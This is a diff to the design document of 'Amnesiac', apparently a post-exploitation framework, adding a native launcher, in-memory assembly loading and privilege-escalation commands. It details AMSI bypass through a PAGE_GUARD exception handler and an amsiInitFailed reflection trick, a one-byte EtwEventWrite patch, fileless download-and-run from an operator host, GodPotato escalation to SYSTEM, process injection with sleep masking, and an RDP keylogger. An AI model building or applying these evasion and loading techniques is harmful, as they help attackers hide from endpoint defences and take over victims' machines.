@@ -106,6 +106,15 @@ Four improvement layers, all changes in `Amnesiac.ps1`:
 | `modules reload` | Refresh tool cache from Tools\ |
 | `artifacts` | List in-memory captured artifacts |
 | `save <type>` | Write artifact to operator disk |
+| `RunBin <name> [args]` | Reflectively load a .NET assembly in-memory (local shell + sessions) |
+
+### LPE Commands (local shell + active sessions)
+
+| Command | Tool file | Effect |
+|---------|-----------|--------|
+| `PowerUp` | `PowerUp.ps1` | Load and auto-run `Invoke-AllChecks` |
+| `PrivescCheck` | `PrivescCheck.ps1` | Load and auto-run `Invoke-PrivescCheck` |
+| `GodPotato` | `Invoke-GodPotato.ps1` | Load GodPotato; prompts for command to run as SYSTEM |
 
 ## Listener UX
 
@@ -156,6 +165,52 @@ Run `Build.ps1` only if you modify the C# source.
 
 ---
 
+## Native Launcher — amsi-pageguard-veh-master
+
+A native C++ launcher (`amnesiac_launcher.exe`) that stages `Amnesiac_ShellReady.ps1` entirely in memory using CLR hosting, with no disk write and no PowerShell process visible in the process list.
+
+### Architecture
+
+Two-stage bypass — split between native and managed because PAGE_GUARD VEH and in-process CLR are mutually incompatible:
+
+| Stage | Location | Technique |
+|-------|----------|-----------|
+| Download phase | `launcher.cpp` (native) | PAGE_GUARD VEH on `AmsiScanBuffer` — intercepts AMSI scan during `DownloadString`, patches return value, then **uninstalls before CLR load** |
+| Runspace phase | `AmnesiacBridge.cs` (managed) | `amsiInitFailed=true` via reflection (patchless); `EtwEventWrite→0xC3` one-byte patch |
+
+**Why the split:** Setting PAGE_GUARD on amsi.dll's code page and manipulating `RIP/RSP/RAX` in the VEH fires again during `rs.Open()` when the CLR JIT touches the same page. This corrupts the managed→unmanaged transition frame and raises an uncatchable `AccessViolationException` in .NET 4.x. The fix: `UninstallBypass()` is called in `launcher.cpp` **before** `ExecuteInDefaultAppDomain`, then `AmnesiacBridge` applies its own patchless bypasses before `Runspace.Open()`.
+
+### Components
+
+| File | Purpose |
+|------|---------|
+| `launcher.cpp` | Native entry point — `DownloadString` via WinHTTP, VEH bypass for download phase, CLR host via `ICLRRuntimeHost::ExecuteInDefaultAppDomain` |
+| `bypass.hpp` | PAGE_GUARD VEH implementation — `InstallBypass` / `UninstallBypass` / `ReprotectAll` |
+| `AmnesiacBridge.cs` | Managed bridge — `DisableAmsi()` (reflection), `PatchEtw()` (P/Invoke), full PSHost + Runspace, `BeginInvoke/EndInvoke` with `DataAdded` streaming |
+| `AmnesiacBridge.csproj` | net462 target, references system SMA DLL |
+| `build.ps1` | Builds bridge with Roslyn csc, compiles launcher with MSVC cl.exe |
+| `.gitignore` | Excludes all compiled binaries (`*.exe`, `*.dll`, `*.obj`, etc.) — do NOT commit binaries to public repo |
+
+### Build
+
+```powershell
+cd amsi-pageguard-veh-master
+.\build.ps1
+# Outputs: amnesiac_launcher.exe, AmnesiacBridge.dll
+```
+
+Requires: MSVC build tools at `C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\`, Roslyn csc, SMA DLL from WinSxS.
+
+### Usage
+
+```
+amnesiac_launcher.exe http://<operator-IP>:8080
+```
+
+Operator's `serve` must be running to serve `Amnesiac_ShellReady.ps1`. The launcher fetches it, applies bypasses, and runs the full Amnesiac session in a native process.
+
+---
+
 ## Tool Delivery
 
 Tools reach targets via the named pipe channel exclusively — no network calls from targets.
@@ -175,6 +230,9 @@ Tools reach targets via the named pipe channel exclusively — no network calls 
 **Tier 3 — GitHub on-demand fetch (`Fetch-ToolFromGitHub`):**
 Implemented as a helper called by `Send-Module`, `Start-LocalShell` keyword dispatch, and `load <name>`. When a tool is not found in tiers 1–2, it fetches `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<ToolName>.ps1` operator-side, caches it in `$global:ToolCache`, and proceeds normally. This is the correct fallback for Scenario 2 (operator has only the compromised machine, no local server). Target never makes any network call.
 
+**Binary tool fetch (`Fetch-BinaryTool`):**
+Used by `RunBin`. Fetches `.exe` or `.dll` binaries via `DownloadData` (binary-safe), stores as base64 in `$global:ToolCache`. Tries `http://<ListenerIP>:8080/<name>.exe` then `.dll` first, then falls back to GitHub. Binary and script caches are unified — same `$global:ToolCache` key, different content type inferred from usage context.
+
 ### Target-Side Delivery (in-session)
 
 `Send-Module <toolname>` streams from `$global:ToolCache` over the named pipe:
@@ -184,6 +242,22 @@ Implemented as a helper called by `Send-Module`, `Start-LocalShell` keyword disp
 
 Target assembles chunks and executes via `[scriptblock]::Create($source).Invoke()`.
 Binary modules (.exe/.dll): base64-decode → `[Reflection.Assembly]::Load()`.
+
+### RunBin — Reflective .NET Assembly Loading
+
+`RunBin <name> [args]` loads a managed assembly entirely in memory with no disk write.
+
+**Local shell (option 5):**
+1. Checks `$global:ToolCache`; calls `Fetch-BinaryTool` on miss
+2. `[Reflection.Assembly]::Load([byte[]])` in the operator's process
+3. `EntryPoint.Invoke($null, @(,[string[]]$args))`
+
+**Active pipe session:**
+1. Checks cache; fetches via `Fetch-BinaryTool` on miss
+2. Streams to target via `Send-Module` chunked protocol
+3. Sends one-liner: finds assembly in `[AppDomain]::CurrentDomain.GetAssemblies()` by name, calls `EntryPoint.Invoke`
+
+Scope: managed .NET assemblies only. For DLLs without an entry point, use `load <name>` to dot-source or `[Reflection.Assembly]::LoadFrom` manually.
 
 ---
 
@@ -209,14 +283,24 @@ Amnesiac-main/
 ├── Tools/                          — tool modules (Standard tier)
 │   ├── SimpleAMSI.ps1
 │   ├── NETAMSI.ps1
-│   ├── ... (23 tools)
+│   ├── PowerUp.ps1                 — LPE: privilege escalation checks
+│   ├── PrivescCheck.ps1            — LPE: comprehensive audit
+│   ├── Invoke-GodPotato.ps1        — LPE: potato SYSTEM escalation
+│   ├── ... (other tools)
 │   └── RDPKeylog.exe
-├── AmnesiacLoader/                 — C# assembly project
+├── AmnesiacLoader/                 — C# assembly (process injection, sleep masking)
 │   ├── Loader.cs
 │   ├── CallStack.cs
 │   ├── SleepMask.cs
 │   ├── AmnesiacLoader.csproj
 │   └── Build.ps1
+├── amsi-pageguard-veh-master/      — native launcher (CLR-hosted, no powershell.exe)
+│   ├── launcher.cpp                — native entry, WinHTTP fetch, CLR host
+│   ├── bypass.hpp                  — PAGE_GUARD VEH bypass (download phase only)
+│   ├── AmnesiacBridge.cs           — managed bridge (patchless AMSI + ETW, Runspace)
+│   ├── AmnesiacBridge.csproj
+│   ├── build.ps1                   — build script (MSVC + Roslyn)
+│   └── .gitignore                  — excludes all compiled binaries
 ├── docs/
 │   └── superpowers/specs/
 │       └── 2026-05-23-amnesiac-stealth-overhaul-design.md
